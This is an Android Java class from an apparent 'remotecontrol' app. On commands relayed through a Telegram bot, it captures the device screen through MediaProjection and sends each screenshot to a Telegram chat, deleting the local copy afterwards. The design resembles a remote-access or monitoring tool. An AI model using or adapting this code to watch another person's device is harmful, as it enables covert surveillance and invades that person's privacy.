package com.remotecontrol;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;

/**
 * ScreenCapture
 *
 * Захват экрана через MediaProjection (Android 12+).
 * Запрос разрешения выполняется через ScreenCaptureRequestActivity (прозрачная Activity).
 * Сам захват — в ScreenCaptureService (Foreground Service, тип mediaProjection).
 */
public class ScreenCapture {

    private static final String TAG = "ScreenCapture";

    // ───── Статические ссылки, управляемые из Service ─────
    private static MediaProjection activeProjection;
    private static VirtualDisplay   virtualDisplay;
    private static ImageReader      imageReader;

    // Callback после готовности скриншота
    public interface ScreenshotCallback {
        void onScreenshot(File file);
        void onError(String message);
    }

    // ──────────────────────────────────────────────────
    //  Публичный API (вызывается из TelegramEngine)
    // ──────────────────────────────────────────────────

    /**
     * Запрашивает скриншот. Если MediaProjection уже активна — снимает сразу.
     * Иначе — запускает ScreenCaptureRequestActivity для получения разрешения.
     */
    public static void requestScreenshot(Context context, long chatId, TelegramEngine engine) {
        if (activeProjection != null) {
            // Projection уже есть — снимаем
            captureWithExistingProjection(context, chatId, engine);
        } else {
            // Нужно запросить разрешение
            Intent intent = new Intent(context, ScreenCaptureRequestActivity.class);
            intent.putExtra("chat_id", chatId);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            // После разрешения ScreenCaptureService вызовет captureWithExistingProjection
        }
    }

    // ──────────────────────────────────────────────────
    //  Вызывается из ScreenCaptureService
    // ──────────────────────────────────────────────────

    /**
     * Инициализация MediaProjection (вызвать из onStartCommand Service).
     */
    public static void initProjection(MediaProjection projection, Context context) {
        activeProjection = projection;
        Log.i(TAG, "MediaProjection initialized");

        // Регистрируем callback на остановку
        if (projection != null) {
            projection.registerCallback(new MediaProjection.Callback() {
                @Override
                public void onStop() {
                    Log.w(TAG, "MediaProjection stopped");
                    release();
                }
            }, null);
        }
    }

    /**
     * Захват экрана и отправка скриншота в Telegram.
     */
    public static void captureWithExistingProjection(Context context,
                                                     long chatId,
                                                     TelegramEngine engine) {
        if (activeProjection == null) {
            Log.e(TAG, "captureWithExistingProjection: projection is null");
            if (engine != null) engine.sendMessage(chatId, "❌ MediaProjection не активна");
            return;
        }

        // Получаем реальное разрешение экрана
        WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        DisplayMetrics metrics = new DisplayMetrics();
        wm.getDefaultDisplay().getRealMetrics(metrics);

        int width  = metrics.widthPixels;
        int height = metrics.heightPixels;
        int dpi    = metrics.densityDpi;

        Log.d(TAG, "Capturing screen: " + width + "x" + height + " dpi=" + dpi);

        // Освобождаем предыдущие ресурсы
        releaseDisplayResources();

        // Создаём ImageReader
        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);

        // Создаём VirtualDisplay
        virtualDisplay = activeProjection.createVirtualDisplay(
                "RemoteControlCapture",
                width, height, dpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(),
                null, null
        );

        // Ждём первый кадр (с небольшой задержкой для стабилизации)
        imageReader.setOnImageAvailableListener(reader -> {
            Image image = null;
            try {
                // Небольшая задержка — VirtualDisplay должен успеть отрисовать
                Thread.sleep(300);

                image = reader.acquireLatestImage();
                if (image == null) {
                    Log.w(TAG, "acquireLatestImage returned null");
                    if (engine != null) engine.sendMessage(chatId, "❌ Кадр не получен");
                    return;
                }

                Bitmap bitmap = imageToBitmap(image);
                File file = bitmapToJpeg(context, bitmap, 85);
                bitmap.recycle();

                if (file != null && engine != null) {
                    engine.sendPhoto(chatId, file, "📸 Скриншот " + System.currentTimeMillis());
                    file.delete(); // Удаляем после отправки
                } else if (engine != null) {
                    engine.sendMessage(chatId, "❌ Ошибка сохранения скриншота");
                }

            } catch (Exception e) {
                Log.e(TAG, "capture error: " + e.getMessage());
                if (engine != null) engine.sendMessage(chatId, "❌ Ошибка скриншота: " + e.getMessage());
            } finally {
                if (image != null) image.close();
                // Убираем listener — нам нужен один кадр
                reader.setOnImageAvailableListener(null, null);
                releaseDisplayResources();
            }
        }, null);
    }

    // ──────────────────────────────────────────────────
    //  Bitmap utilities
    // ──────────────────────────────────────────────────

    private static Bitmap imageToBitmap(Image image) {
        Image.Plane[] planes = image.getPlanes();
        ByteBuffer buffer = planes[0].getBuffer();
        int width  = image.getWidth();
        int height = image.getHeight();
        int pixelStride = planes[0].getPixelStride();
        int rowStride   = planes[0].getRowStride();
        int rowPadding  = rowStride - pixelStride * width;

        // Учитываем возможный padding строки
        Bitmap bitmap = Bitmap.createBitmap(
                width + rowPadding / pixelStride,
                height,
                Bitmap.Config.ARGB_8888
        );
        bitmap.copyPixelsFromBuffer(buffer);

        // Обрезаем до реального размера если был padding
        if (rowPadding != 0) {
            Bitmap cropped = Bitmap.createBitmap(bitmap, 0, 0, width, height);
            bitmap.recycle();
            return cropped;
        }
        return bitmap;
    }

    private static File bitmapToJpeg(Context context, Bitmap bitmap, int quality) {
        File file = new File(context.getCacheDir(), "screenshot_" + System.currentTimeMillis() + ".jpg");
        try (FileOutputStream fos = new FileOutputStream(file)) {
            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, fos);
            fos.flush();
            Log.d(TAG, "Saved JPEG: " + file.length() / 1024 + " KB");
            return file;
        } catch (IOException e) {
            Log.e(TAG, "bitmapToJpeg error: " + e.getMessage());
            return null;
        }
    }

    // ──────────────────────────────────────────────────
    //  Cleanup
    // ──────────────────────────────────────────────────

    public static void release() {
        releaseDisplayResources();
        if (activeProjection != null) {
            try { activeProjection.stop(); } catch (Exception ignored) {}
            activeProjection = null;
        }
        Log.i(TAG, "ScreenCapture released");
    }

    private static void releaseDisplayResources() {
        if (virtualDisplay != null) {
            try { virtualDisplay.release(); } catch (Exception ignored) {}
            virtualDisplay = null;
        }
        if (imageReader != null) {
            try { imageReader.close(); } catch (Exception ignored) {}
            imageReader = null;
        }
    }
}
